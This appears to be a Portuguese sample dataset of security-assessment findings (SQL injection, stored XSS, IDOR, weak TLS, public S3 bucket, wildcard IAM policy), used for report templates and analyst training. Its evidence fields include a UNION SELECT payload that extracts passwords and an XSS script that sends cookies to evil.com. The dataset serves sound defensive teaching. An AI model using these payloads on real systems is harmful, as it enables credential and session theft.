# Sample Findings Dataset

Dataset de findings representativos para treinamento, templates e referencia.

## Web Application Findings

### FIND-SAMPLE-001: SQL Injection
- **Severity**: Critical (CVSS 9.8)
- **Location**: POST /api/v2/users/search, parametro `query`
- **Evidence**: `query=test' UNION SELECT username,password FROM users--`
- **Impact**: Extracao completa do banco de dados, bypass de autenticacao
- **Remediation**: Implementar parameterized queries, input validation

### FIND-SAMPLE-002: Stored XSS
- **Severity**: High (CVSS 7.5)
- **Location**: Campo "nome" no perfil do usuario
- **Evidence**: `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
- **Impact**: Session hijacking, account takeover de outros usuarios
- **Remediation**: Output encoding, Content Security Policy

### FIND-SAMPLE-003: IDOR
- **Severity**: High (CVSS 7.1)
- **Location**: GET /api/v2/invoices/{id}
- **Evidence**: Alterando ID sequencial acessa faturas de outros clientes
- **Impact**: Vazamento de dados financeiros de clientes
- **Remediation**: Implementar authorization checks server-side

## Infrastructure Findings

### FIND-SAMPLE-004: Outdated TLS Configuration
- **Severity**: Medium (CVSS 5.3)
- **Location**: lb-prod-01.example.com:443
- **Evidence**: TLS 1.0 e 1.1 habilitados, cipher suites fracas
- **Impact**: Possibilidade de downgrade attack
- **Remediation**: Desabilitar TLS < 1.2, remover cipher suites fracas

### FIND-SAMPLE-005: Open S3 Bucket
- **Severity**: Critical (CVSS 9.1)
- **Location**: s3://company-backups-prod
- **Evidence**: Bucket com ACL public-read, contendo database dumps
- **Impact**: Exposicao de dados sensiveis de clientes
- **Remediation**: Remover public access, habilitar S3 Block Public Access

## Cloud Findings

### FIND-SAMPLE-006: Overly Permissive IAM Role
- **Severity**: High (CVSS 8.1)
- **Location**: IAM Role `lambda-execution-role`
- **Evidence**: Policy com `"Action": "*", "Resource": "*"`
- **Impact**: Comprometimento da Lambda permite controle total da conta AWS
- **Remediation**: Aplicar least privilege, scoping por recurso e acao

## Uso

Estes samples servem como referencia para padronizacao de escrita de findings,
treinamento de novos analistas e templates para relatorios de assessment.
